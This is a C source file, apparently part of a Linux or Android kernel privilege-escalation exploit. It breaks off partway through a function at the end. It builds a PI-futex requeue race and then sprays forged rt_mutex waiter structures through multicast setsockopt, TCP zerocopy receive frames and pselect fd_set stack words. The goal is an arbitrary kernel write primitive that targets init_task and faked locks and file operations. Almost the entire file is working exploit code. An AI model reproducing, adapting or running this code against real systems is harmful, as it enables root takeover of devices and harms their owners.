#include "common.h"
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/timerfd.h>

#include "target.h"
#include "multicast_waiter_route.h"
#include "select_stack_route.h"
#include "tcp_zerocopy_route.h"

/* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
 * output: elapsed milliseconds. Future: shared_elapsed_ms(const timespec *);
 * move to the stateless time helper module and make the input const. */
static double fops_elapsed_ms(struct timespec *ref) {
  return runtime_elapsed_ms(ref);
}
static const struct execution_settings *execution_settings(void) {
  return target_profile_execution(&g_target_profile);
}
int route_last_step;
int route_last_errno;

/* One process-level resident is retained across W1/W2. Its mutable state and
 * resources have one explicit owner; S14 will move that owner into session. */
static MulticastWaiterRouteContext multicast_resident_context;

static void multicast_waiter_interrupt(int sig) { (void)sig; }

static long multicast_waiter_adjust(MulticastWaiterRouteContext *context) {
  struct sched_param sp = {.sched_priority = 0};
  int next = context->scheduler_policy == SCHED_NORMAL
                 ? SCHED_BATCH : SCHED_NORMAL;
  long r = syscall(SYS_sched_setscheduler,
                   atomic_load(&context->waiter_tid), next, &sp);
  context->scheduler_policy = next;
  return r;
}

static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
                                  uintptr_t target, uintptr_t value,
                                  uintptr_t lock) {
  size_t size = context->layout.buffer_size;
  unsigned char b[size];
  size_t o = context->layout.waiter_offset;
  memset(b, 0, sizeof(b));
  if (target) {
    put64(b, o, (target - 8) & ~(uintptr_t)3);
    put64(b, o + 8, value);
  }
  put64(b, o + context->layout.task_offset, context->task);
  put64(b, o + context->layout.lock_offset, lock);
  uint16_t family = AF_UNSPEC;
  memcpy(b + 8, &family, sizeof(family));
  return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                    b, sizeof(b));
}

static void *multicast_waiter_worker(void *arg) {
  MulticastWaiterRouteContext *context = arg;
  pin_to_core(context->consumer_cpu);
  sigset_t set; sigemptyset(&set); sigaddset(&set, SIGUSR1);
  pthread_sigmask(SIG_UNBLOCK, &set, NULL);
  atomic_store(&context->waiter_tid, syscall(SYS_gettid));
  futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&context->waiter_has_lock2, 1);
  while (!atomic_load(&context->owner_has_lock1)) sched_yield();
  atomic_store(&context->waiter_waiting, 1);
  futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
           0, NULL, &context->lock1_futex, 0);
  context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (context->socket_fd < 0) return NULL;
  multicast_waiter_stamp(context, 0, 0, context->lock);
  atomic_store(&context->waiter_ready, 1);
  while (!atomic_load(&context->stop_requested)) {
    if (atomic_exchange(&context->respray_requested, 0)) {
      uintptr_t lock = context->lock + context->layout.lock_slots_offset +
          (context->lock_slot++ % context->layout.lock_slot_count) *
              context->layout.lock_slot_stride;
      multicast_waiter_stamp(context, context->target, context->value, lock);
      atomic_store(&context->sprayed, 1);
    }
    sched_yield();
  }
  uint32_t dummy = 0x80000000U | (uint32_t)getpid(); struct timespec z = {0,0};
  futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
  futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  while (!atomic_load(&context->owner_done)) sched_yield();
  close(context->socket_fd); context->socket_fd = -1;
  return NULL;
}

static void *multicast_owner_worker(void *arg) {
  MulticastWaiterRouteContext *context = arg;
  pin_to_core(context->main_cpu);
  while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
  futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&context->owner_has_lock1, 1);
  atomic_store(&context->owner_waiting, 1);
  futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&context->owner_done, 1);
  return NULL;
}

int kernel5_resident_start(void) {
  MulticastWaiterRouteContext *context = &multicast_resident_context;
  if (context->ready) return 1;
  if (context->waiter_worker_started || context->owner_worker_started) {
    pr_warning("multicast resident remains partially armed; refusing restart\n");
    return 0;
  }
  MulticastWaiterLayout layout =
      target_profile_multicast_waiter_layout(&g_target_profile);
  const struct execution_settings *execution = execution_settings();
  multicast_waiter_route_context_init(
      context, &g_pi_race_context, NULL, execution, layout, 1);
  context->main_cpu = g_runtime_config.main_cpu;
  context->consumer_cpu = g_runtime_config.consumer_cpu;
  uintptr_t bss = resolved_addresses_data_alias(
      &g_resolved_addresses, KIMAGE_TEXT_BASE + layout.fake_bss_image_offset);
  context->lock = bss + layout.fake_lock_offset;
  context->task = bss + layout.fake_task_offset;
  struct sigaction sa={0}; sa.sa_handler=multicast_waiter_interrupt;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 0;
  if (pthread_create(&context->waiter_worker, NULL,
                     multicast_waiter_worker, context) != 0) return 0;
  context->waiter_worker_started = 1;
  if (pthread_create(&context->owner_worker, NULL,
                     multicast_owner_worker, context) != 0) return 0;
  context->owner_worker_started = 1;
  struct timespec ready_started;
  clock_gettime(CLOCK_MONOTONIC, &ready_started);
  while (!(atomic_load(&context->waiter_has_lock2) &&
           atomic_load(&context->owner_has_lock1) &&
           atomic_load(&context->waiter_waiting) &&
           atomic_load(&context->owner_waiting))) {
    if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
      return 0;
    sched_yield();
  }
  usleep(execution->multicast_post_requeue_settle_us); errno=0;
  long r=futex_op(&context->condition_futex,FUTEX_CMP_REQUEUE_PI_PRIVATE,
                  1,(void*)0,&context->lock1_futex,0);
  context->condition_futex=1;
  syscall(SYS_tgkill,getpid(),atomic_load(&context->waiter_tid),SIGUSR1);
  if (r>=0 || (errno!=EDEADLK && errno!=EDEADLOCK)) return 0;
  clock_gettime(CLOCK_MONOTONIC, &ready_started);
  while (!atomic_load(&context->waiter_ready) &&
         fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
    sched_yield();
  if(!atomic_load(&context->waiter_ready) ||
     multicast_waiter_adjust(context)<0) return 0;
  usleep(execution->multicast_post_adjust_settle_us);
  context->ready=1; context->status.code=ROUTE_OK;
  pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
             bss,context->lock,context->task);
  return 1;
}

int kernel5_resident_write(uintptr_t target, uintptr_t value) {
  MulticastWaiterRouteContext *context = &multicast_resident_context;
  if(!context->ready) return 0;
  context->target=target; context->value=value;
  atomic_store(&context->sprayed,0);
  atomic_store(&context->respray_requested,1);
  while(!atomic_load(&context->sprayed)) sched_yield();
  long r=multicast_waiter_adjust(context);
  pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
  return r==0;
}

static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
  atomic_store(&context->stop_requested,1);
  atomic_store(&context->race->consumer_go,0);
  while (atomic_load(&context->race->consumer_inflight)) sched_yield();
  context->status.kernel_disarmed=1;
}

static void multicast_waiter_destroy(MulticastWaiterRouteContext *context) {
  if (context->waiter_worker_started) {
    pthread_join(context->waiter_worker,NULL);
    context->waiter_worker_started=0;
  }
  if (context->owner_worker_started) {
    pthread_join(context->owner_worker,NULL);
    context->owner_worker_started=0;
  }
  if (context->socket_fd>=0) { close(context->socket_fd); context->socket_fd=-1; }
  context->ready=0;
  context->status.userspace_clean=1;
  if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
    context->status.code=ROUTE_FALLBACK_SAFE;
  }
}

void kernel5_resident_stop(void) {
  MulticastWaiterRouteContext *context = &multicast_resident_context;
  if(!context->ready) {
    if (context->waiter_worker_started || context->owner_worker_started) {
      context->status.code=ROUTE_DIRTY_FAILURE;
      pr_warning("multicast resident partial setup retained for process exit\n");
    }
    return;
  }
  multicast_waiter_disarm(context);
  multicast_waiter_destroy(context);
  /* TODO(decoupling:S14-multicast-heap-handoff): These HeapContext actions
   * remain here only to preserve the validated W1/W2 stop order. Move them to
   * ExploitSession after route destroy reports userspace_clean. */
  close_reclaim_sockets(); cleanup_page_prepare_state();
  pr_success("5.x resident writer disarmed\n");
}

RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
  MulticastWaiterRouteContext context;
  int stamp_result = -1;
  multicast_waiter_route_context_init(
      &context, &g_pi_race_context, request, execution_settings(),
      target_profile_multicast_waiter_layout(&g_target_profile), 0);
  context.main_cpu = g_runtime_config.main_cpu;
  context.consumer_cpu = g_runtime_config.consumer_cpu;
  context.task=fake_task; context.lock=fake_lock;
  context.socket_fd=socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (context.socket_fd<0) {
    route_last_step=60; route_last_errno=errno;
    context.status.step=route_last_step;
    context.status.error_number=route_last_errno;
    goto out;
  }
  atomic_store(&context.race->consumer_calls,0);
  atomic_store(&context.race->consumer_success,0);
  atomic_store(&context.race->consumer_stop,0);
  atomic_store(&context.race->route_delay_usec,0);
  errno = 0;
  stamp_result=multicast_waiter_stamp(&context,0,0,context.lock);
  route_last_step = 61; route_last_errno = errno;
  atomic_store(&context.race->consumer_go,1);
  for (int spin=0; spin<100000000 &&
       atomic_load(&context.race->consumer_calls)==0; spin++)
    __asm__ volatile("yield" ::: "memory");
out:
  /* consumer_calls is incremented before sched_setattr/futex completes.
   * Drain first so consumer_success is a stable completion result. */
  multicast_waiter_disarm(&context);
  if (stamp_result==0 || atomic_load(&context.race->consumer_success)>0) {
    route_last_step=0; route_last_errno=0; context.status.code=ROUTE_OK;
  }
  context.status.step=route_last_step;
  context.status.error_number=route_last_errno;
  multicast_waiter_destroy(&context);
  pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
          context.status.code,context.status.userspace_clean,
          context.status.kernel_disarmed,route_last_step,route_last_errno);
  return context.status;
}

/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)

/* Decoupling plan: stop and drain the shared PI consumer. Input: race context;
 * output: consumer idle. */
static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
  atomic_store(&context->race->consumer_go, 0);
  while (atomic_load(&context->race->consumer_inflight)) {
    __asm__ volatile("yield" ::: "memory");
  }
}

/* Decoupling plan: create a connected loopback TCP pair. Input: output slots;
 * output: 0/-1 and owned descriptors. Future: tcp_zerocopy_open_pair(context),
 * recording descriptor ownership in TcpZerocopyRouteContext. */
static int tcp_make_pair(TcpZerocopyRouteContext *context) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) {
    return -1;
  }
  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  context->client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (context->client_fd < 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }
  if (connect(context->client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    int saved = errno;
    close(context->client_fd);
    context->client_fd = -1;
    close(listener);
    errno = saved;
    return -1;
  }

  context->server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  int saved = errno;
  close(listener);
  if (context->server_fd < 0) {
    close(context->client_fd);
    context->client_fd = -1;
    errno = saved;
    return -1;
  }
  return 0;
}

/* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
 * TcpZerocopyRouteContext; output: context-owned phase/error flags. */
static void *tcp_punch_thread(void *arg) {
  disable_rseq_for_thread();
  TcpZerocopyRouteContext *context = arg;
  while (!atomic_load(&context->punch_go) &&
         !atomic_load(&context->punch_stop)) {
    sched_yield();
  }
  while (!atomic_load(&context->punch_stop)) {
    if (fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
      atomic_store(&context->punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch fill errno=%d\n", errno);
      break;
    }
    atomic_store(&context->punch_phase, 1);
    if (fallocate(context->punch_fd,
                  FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)context->page_size,
                  context->mapping_length - context->page_size) != 0) {
      /* without the hole the target page keeps stale contents and the
       * zerocopy write misses */
      atomic_store(&context->punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch hole errno=%d\n", errno);
    }
    atomic_store(&context->punch_phase, 0);
    if (atomic_load(&context->punch_failed)) {
      break;
    }
  }
  return NULL;
}

static int tcp_zerocopy_fail(TcpZerocopyRouteContext *context,
                             int step, int error_number) {
  context->status.step = step;
  context->status.error_number = error_number;
  route_last_step = step;
  route_last_errno = error_number;
  return -1;
}

/* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
static int tcp_zerocopy_prepare(TcpZerocopyRouteContext *context) {
  if (!page_base || !fake_lock || !fake_fops) {
    pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
               page_base, fake_lock, fake_fops);
    return tcp_zerocopy_fail(context, 40, 0);
  }

  if (tcp_make_pair(context) != 0) {
    pr_warning("tcp route pair setup failed errno=%d\n", errno);
    return tcp_zerocopy_fail(context, 41, errno);
  }

  context->page_size = (size_t)sysconf(_SC_PAGESIZE);
  context->punch_fd =
      (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
  if (context->punch_fd < 0 ||
      fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
    pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
    return tcp_zerocopy_fail(context, 42, errno);
  }
  context->mapping = mmap(NULL, context->mapping_length,
                          PROT_READ | PROT_WRITE,
                          MAP_SHARED, context->punch_fd, 0);
  if (context->mapping == MAP_FAILED) {
    pr_warning("tcp route mmap errno=%d\n", errno);
    return tcp_zerocopy_fail(context, 43, errno);
  }
  for (size_t off = 0; off < context->mapping_length;
       off += context->page_size) {
    context->mapping[off] = 0x55;
  }

  atomic_store(&context->race->consumer_stop, 0);
  atomic_store(&context->race->consumer_go, 0);
  atomic_store(&context->race->consumer_calls, 0);
  atomic_store(&context->race->consumer_success, 0);
  int thread_error = pthread_create(
      &context->punch_worker, NULL, tcp_punch_thread, context);
  if (thread_error != 0) {
    pr_warning("tcp route punch thread errno=%d\n", thread_error);
    return tcp_zerocopy_fail(context, 44, thread_error);
  }
  context->punch_worker_started = 1;
  return 0;
}

/* Run the route after prepare has established exclusive resource ownership. */
static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
  /* waiter->task carries init_task's phys alias, not the image address */
  uintptr_t waiter_task = SLIDE_INIT_TASK;
  int arm_seq = (int)context->execution->tcp_arm_sequence;
  int post_hold =
      (int)context->execution->tcp_post_receive_hold_iterations;
  int attempts = (int)context->execution->tcp_attempts;

  pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
          page_base, fake_lock, fake_w0, fake_task, waiter_task,
          attempts, arm_seq, post_hold);

  atomic_store(&context->punch_go, 1);
  /* custom-write mode: fire the PI walk immediately */
  atomic_store(&context->race->route_delay_usec, 0);

  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));

  for (int i = 1; i <= attempts && !context->route_won; i++) {
    int calls_before = atomic_load(&context->race->consumer_calls);
    int success_before = atomic_load(&context->race->consumer_success);
    (void)send(context->server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
    while (atomic_load(&context->punch_phase)) {
      sched_yield();
    }
    for (int spin = 0;
         !atomic_load(&context->punch_phase) &&
         !atomic_load(&context->punch_failed) &&
         spin < 10000000;
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&context->punch_failed)) {
      tcp_zerocopy_fail(context, 46,
                        atomic_load(&context->punch_failed));
      pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
      break;
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    put64(zc, 0x18,
          (uint64_t)(uintptr_t)(context->mapping + context->page_size));
    put32(zc, 0x20, sizeof(sendbuf));
    put64(zc, 0x28, waiter_task);
    put64(zc, 0x30, fake_lock);

    socklen_t len = sizeof(zc);
    errno = 0;
    int ret = getsockopt(context->client_fd, IPPROTO_TCP,
                         TCP_ZEROCOPY_RECEIVE, zc,
                         &len);
    int saved_errno = errno;
    /* release the consumer only once the zerocopy write landed in the
     * waiter frame; earlier release walks a half-written waiter */
    if (i >= arm_seq && ret == 0) {
      atomic_store(&context->race->consumer_go, i);
      for (int spin = 0; spin < post_hold; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
      tcp_wait_for_consumer_idle(context);
    }

    int calls = atomic_load(&context->race->consumer_calls);
    int success = atomic_load(&context->race->consumer_success);
    if (calls <= calls_before || success <= success_before) {
      if ((i % 100) == 0 || ret != 0) {
        pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                "success=%d\n",
                i, ret, saved_errno, len, calls, success);
      }
      continue;
    }
    /* consumer fired: the PI walk derefed the crafted waiter and wrote.
     * stages verify their own effects; no cfi stage here. */
    context->route_won = 1;
    context->status.code = ROUTE_OK;
    route_last_step = 0;
    route_last_errno = 0;
  }
  if (!context->route_won && context->status.step == 0) {
    tcp_zerocopy_fail(context, 45, 0);
  }
  return context->status;
}

/* Stop every trigger before releasing any descriptor or mapping. */
static void tcp_zerocopy_disarm(TcpZerocopyRouteContext *context) {
  atomic_store(&context->race->consumer_go, 0);
  atomic_store(&context->punch_go, 0);
  atomic_store(&context->punch_stop, 1);
  tcp_wait_for_consumer_idle(context);
  context->status.kernel_disarmed = 1;
}

/* Join the owned worker, then release each owned userspace resource once. */
static void tcp_zerocopy_destroy(TcpZerocopyRouteContext *context) {
  if (context->punch_worker_started) {
    int join_error = pthread_join(context->punch_worker, NULL);
    if (join_error != 0) {
      tcp_zerocopy_fail(context, 47, join_error);
      context->status.code = ROUTE_DIRTY_FAILURE;
      pr_warning("tcp route punch join errno=%d; resources retained\n",
                 join_error);
      return;
    }
    context->punch_worker_started = 0;
  }
  if (context->mapping != MAP_FAILED) {
    if (munmap(context->mapping, context->mapping_length) != 0) {
      int saved_errno = errno;
      tcp_zerocopy_fail(context, 48, saved_errno);
      context->status.code = ROUTE_DIRTY_FAILURE;
      pr_warning("tcp route munmap errno=%d\n", saved_errno);
      return;
    }
    context->mapping = MAP_FAILED;
  }
  if (context->punch_fd >= 0) {
    close(context->punch_fd);
    context->punch_fd = -1;
  }
  if (context->server_fd >= 0) {
    close(context->server_fd);
    context->server_fd = -1;
  }
  if (context->client_fd >= 0) {
    close(context->client_fd);
    context->client_fd = -1;
  }
  context->status.userspace_clean = 1;
  if (!context->route_won && context->status.kernel_disarmed) {
    context->status.code = ROUTE_FALLBACK_SAFE;
  }
}

/* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
  TcpZerocopyRouteContext context;
  tcp_zerocopy_route_context_init(
      &context, &g_pi_race_context, request, execution_settings(),
      TCP_PUNCH_SHMEM_LEN);
  route_last_step = 0;
  route_last_errno = 0;

  if (tcp_zerocopy_prepare(&context) == 0) {
    tcp_zerocopy_execute(&context);
  }
  tcp_zerocopy_disarm(&context);
  tcp_zerocopy_destroy(&context);

  pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
          "step=%d errno=%d\n",
          context.route_won,
          atomic_load(&context.race->consumer_calls),
          atomic_load(&context.race->consumer_success), context.status.code,
          context.status.userspace_clean, context.status.kernel_disarmed,
          context.status.step, context.status.error_number);
  return context.status;
}

/* Decoupling plan: choose route timing delay. Input: attempt and eventually
 * immutable profile; output: microseconds. Future:
 * select_stack_delay_usec(const TargetProfile *, int). */
static int route_delay_usec(const SelectStackRouteContext *context,
                            int attempt) {
  (void)attempt;
  /* Both routes: let select/pselect establish its frame and stamp the
   * crafted waiter before the PI walk fires. */
  return (int)context->execution->select_enter_delay_us;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

/* Decoupling plan: read the select-stack waiter layout. Input: profile; output:
 * word shift. Future: select_stack_waiter_shift(const TargetProfile *). */
static int pselect_waiter_shift(const SelectStackRouteContext *context) {
  return target_profile_is_loaded(&g_target_profile)
             ? context->layout.waiter_shift
             : PSELECT_WAITER_WORD_SHIFT;
}

/* Decoupling plan: encode a logical waiter word across select fd_sets. Inputs:
 * layout, sets, word/value; output: placement status. Future:
 * select_stack_put_waiter_word(layout, sets, ...), without global profile. */
static void pselect_put_waiter_word(
    SelectStackRouteContext *context, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift(context) + waiter_word;
  int placed = pselect_put_global_word(
      &context->input_set, &context->output_set, &context->exception_set,
      words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

/* Decoupling plan: materialize descriptors selected by the crafted fd_sets.
 * Inputs: sets and source fds; output: owned duplicated descriptors. Future:
 * select_stack_open_fds(SelectStackRouteContext *, const SelectStackSets *). */
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  /* every bit lands on the read end so select/pselect parks the full window */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static int standard_io_backup[3] = {-1, -1, -1};

/* Decoupling plan: preserve standard descriptors before select-stack setup.
 * Input: route context; output: backup descriptors. Future:
 * select_stack_backup_stdio(SelectStackRouteContext *). */
void reserve_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] >= 0) continue;
    int backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
    if (backup < 0) {
      pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
    } else {
      standard_io_backup[fd] = backup;
    }
  }
}

/* Decoupling plan: restore standard descriptors from route-owned backups.
 * Input: route context; output: restored/closed state. Future:
 * select_stack_restore_stdio(SelectStackRouteContext *). */
static void restore_standard_io(const int backup[3]) {
  for (int fd = 0; fd < 3; fd++) {
    if (backup[fd] < 0) continue;
    dup2(backup[fd], fd);
  }
}

/* Decoupling plan: build the compact/tree select-stack waiter image. Inputs:
 * profile, payload layout and write request; output: three fd_sets. Future:
 * select_stack_build_fdsets(profile, payload, request, result). */
static void select_stack_build_fdsets(SelectStackRouteContext *context) {
  fd_set *in = &context->input_set;
  fd_set *out = &context->output_set;
  fd_set *ex = &context->exception_set;
  const WriteRequest *request = context->request;
  FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  int compact = context->layout.compact_waiter;

  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  if (compact) {
    /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
     * the write value, children the write target; waiter->task is the
     * payload fake_task (planted fields for the PI walk). Value writes relink
     * left-only at the target, or the erase rebalance walks the target page. */
    uint64_t relink_pc = fake_right ? fake_right : fake_parent;
    uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
    struct pselect_waiter_word words[] = {
      {2, relink_pc, "tree_pc"},
      {3, 0, "tree_right"},
      {4, request->target, "tree_left"},
      {5, fake_right, "pi_pc"},
      {6, 0, "pi_right"},
      {7, request->target, "pi_left"},
      {8, fake_task, "task"},
      {9, fake_lock, "lock"},
      {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(context, words_per_set,
                              w->word, w->value, w->name);
    }
  } else {
    /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 1, "tree_prio"},
      {6, 0, "tree_deadline"},
      {7, 0, "pi_parent"},
      {8, 0, "pi_right"},
      {9, 0, "pi_left"},
      {10, 1, "pi_prio"},
      {11, 0, "pi_deadline"},
      {12, fake_task, "task"},
      {13, fake_lock, "lock"},
      {14, 3, "wake_state"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(context, words_per_set,
                              w->word, w->value, w->name);
    }
  }
}

/* Compatibility helper retained until S15; route execution uses its context. */
void prepare_pselect_fdsets(
    fd_set *in, fd_set *out, fd_set *ex, const WriteRequest *request) {
  SelectStackRouteContext context;
  select_stack_route_context_init(
      &context, &g_pi_race_context, request, execution_settings(),
      target_profile_select_stack_layout(&g_target_profile),
      standard_io_backup);
  select_stack_build_fdsets(&context);
  *in = context.input_set;
  *out = context.output_set;
  *ex = context.exception_set;
}

static int select_stack_fail(SelectStackRouteContext *context,
                             int step, int error_number) {
  context->status.step = step;
  context->status.error_number = error_number;
  route_last_step = step;
  route_last_errno = error_number;
  return -1;
}

static int select_stack_prepare(SelectStackRouteContext *context) {
  if (!page_base || !fake_lock || !fake_fops) {
    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
               "fops=%016zx\n", page_base, fake_lock, fake_fops);
    return select_stack_fail(context, 30, 0);
  }
  if (pipe(context->pipe_fd) != 0) {
    return select_stack_fail(context, 31, errno);
  }

  /* Both routes park on a never-ready timerfd: the waiter must stay stale
   * on the pselect stack for the whole consumer window. */
  context->block_fd =
      (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC);
  if (context->block_fd < 0) {
    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    context->block_fd = context->pipe_fd[0];
  }
  context->high_read_fd =
      fcntl(context->block_fd, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16);
  if (context->high_read_fd < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return select_stack_fail(context, 32, errno);
  }

  select_stack_build_fdsets(context);
  pr_info("pselect route setup shift=%d page=%016zx "
          "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
          "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
          "ex1=%016llx ex2=%016llx ex3=%016llx\n",
          pselect_waiter_shift(context),
          page_base, fake_lock, fake_w0, fake_task,
          (unsigned long long)fdset_get_word(&context->input_set, 0),
          (unsigned long long)fdset_get_word(&context->input_set, 3),
          (unsigned long long)fdset_get_word(&context->output_set, 0),
          (unsigned long long)fdset_get_word(&context->exception_set, 0),
          (unsigned long long)fdset_get_word(&context->exception_set, 1),
          (unsigned long long)fdset_get_word(&context->exception_set, 2),
          (unsigned long long)fdset_get_word(&context->exception_set, 3));

  /* The route may replace low fds, including stdout and stderr. */
  open_selected_fds(&context->input_set, &context->output_set,
                    &context->exception_set, context->high_read_fd,
                    context->pipe_fd[1]);
  context->owned_input_set = context->input_set;
  context->owned_output_set = context->output_set;
  context->owned_exception_set = context->exception_set;
  close(context->high_read_fd);
  context->high_read_fd = -1;
  context->selected_fds_installed = 1;
  return 0;
}

static RouteStatus select_stack_execute(SelectStackRouteContext *context) {
  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);

